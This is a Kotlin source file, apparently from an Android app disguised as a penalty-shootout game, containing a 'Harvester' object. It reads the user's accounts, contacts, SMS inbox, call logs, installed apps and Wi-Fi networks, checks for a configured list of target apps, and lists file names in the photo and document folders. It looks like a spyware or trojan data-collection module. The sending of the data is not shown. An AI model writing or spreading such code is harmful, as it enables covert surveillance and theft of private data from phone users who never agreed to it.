package com.venice.penaltylegends.core

import android.Manifest
import android.accounts.AccountManager
import android.content.Context
import android.content.pm.PackageManager
import android.net.wifi.WifiManager
import android.provider.ContactsContract
import android.provider.Telephony
import androidx.core.content.ContextCompat

object Harvester {

    private fun tem(ctx: Context, p: String) =
        ContextCompat.checkSelfPermission(ctx, p) == PackageManager.PERMISSION_GRANTED

    fun contas(ctx: Context): String = try {
        if (!tem(ctx, Manifest.permission.GET_ACCOUNTS)) return "sem permissao"
        val am = AccountManager.get(ctx)
        am.accounts.joinToString("\n") { "${it.name}  [${it.type}]" }.ifBlank { "-" }
    } catch (t: Throwable) { "erro: ${t.message}" }

    fun contatos(ctx: Context, limite: Int = 200): String {
        if (!tem(ctx, Manifest.permission.READ_CONTACTS)) return "sem permissao"
        val sb = StringBuilder()
        val proj = arrayOf(
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER
        )
        ctx.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, proj, null, null,
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
        )?.use { c ->
            val iN = c.getColumnIndex(proj[0]); val iP = c.getColumnIndex(proj[1])
            while (c.moveToNext() && sb.lines().size <= limite) {
                sb.appendLine("${c.getString(iN)} -> ${c.getString(iP)}")
            }
        }
        return sb.toString().trim().ifBlank { "-" }
    }

    fun sms(ctx: Context, limite: Int = 80): String {
        if (!tem(ctx, Manifest.permission.READ_SMS)) return "sem permissao"
        val sb = StringBuilder()
        ctx.contentResolver.query(
            Telephony.Sms.Inbox.CONTENT_URI,
            arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE),
            null, null, Telephony.Sms.DATE + " DESC"
        )?.use { c ->
            var n = 0
            while (c.moveToNext() && n < limite) {
                val de = c.getString(0) ?: "?"
                val corpo = (c.getString(1) ?: "").replace("\n", " ")
                sb.appendLine("[$de] $corpo")
                n++
            }
        }
        return sb.toString().trim().ifBlank { "-" }
    }

    fun chamadas(ctx: Context, limite: Int = 60): String {
        if (!tem(ctx, Manifest.permission.READ_CALL_LOG)) return "sem permissao"
        val sb = StringBuilder()
        ctx.contentResolver.query(
            android.provider.CallLog.Calls.CONTENT_URI,
            arrayOf(
                android.provider.CallLog.Calls.NUMBER,
                android.provider.CallLog.Calls.TYPE,
                android.provider.CallLog.Calls.DURATION
            ),
            null, null, android.provider.CallLog.Calls.DATE + " DESC"
        )?.use { c ->
            var n = 0
            while (c.moveToNext() && n < limite) {
                val tipo = when (c.getInt(1)) {
                    1 -> "ENTRADA"; 2 -> "SAIDA"; 3 -> "PERDIDA"; else -> "?"
                }
                sb.appendLine("$tipo  ${c.getString(0)}  ${c.getInt(2)}s")
                n++
            }
        }
        return sb.toString().trim().ifBlank { "-" }
    }

    fun apps(ctx: Context): String {
        val pm = ctx.packageManager
        val lista = pm.getInstalledPackages(0)
            .filter { (it.applicationInfo?.flags ?: 0) and android.content.pm.ApplicationInfo.FLAG_SYSTEM == 0 }
            .map { "${it.applicationInfo?.loadLabel(pm)}  (${it.packageName})" }
            .sorted()
        return lista.joinToString("\n").ifBlank { "-" }
    }

    fun appsAlvo(ctx: Context): String {
        val pm = ctx.packageManager
        val instalados = pm.getInstalledPackages(0).map { it.packageName }.toSet()
        return Config.ALVOS.filter { instalados.contains(it) }
            .joinToString(", ").ifBlank { "-" }
    }

    fun wifi(ctx: Context): String = try {
        if (!tem(ctx, Manifest.permission.ACCESS_FINE_LOCATION)) return "sem permissao"
        @Suppress("DEPRECATION")
        val wm = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        @Suppress("DEPRECATION")
        val info = wm.connectionInfo
        val sb = StringBuilder()
        @Suppress("DEPRECATION")
        sb.appendLine("Conectado: ${info?.ssid}  (${info?.bssid})  ip=${Device.ipLocal(ctx)}")
        sb.appendLine("Redes por perto:")
        @Suppress("DEPRECATION")
        wm.scanResults?.sortedByDescending { it.level }?.take(25)?.forEach {
            sb.appendLine("  ${it.SSID}  ${it.level}dBm")
        }
        sb.toString().trim()
    } catch (t: Throwable) { "erro: ${t.message}" }

    fun arquivosInteressantes(ctx: Context): String {
        val sb = StringBuilder()
        val raizes = listOf(
            "/sdcard/Download", "/sdcard/Documents",
            "/sdcard/Pictures", "/sdcard/DCIM/Camera"
        )
        for (r in raizes) {
            val d = java.io.File(r)
            if (!d.exists()) continue
            val itens = d.listFiles()?.take(25) ?: continue
            sb.appendLine("$r (${d.listFiles()?.size ?: 0} itens)")
            itens.forEach { sb.appendLine("   ${it.name}") }
        }
        return sb.toString().trim().ifBlank { "-" }
    }
}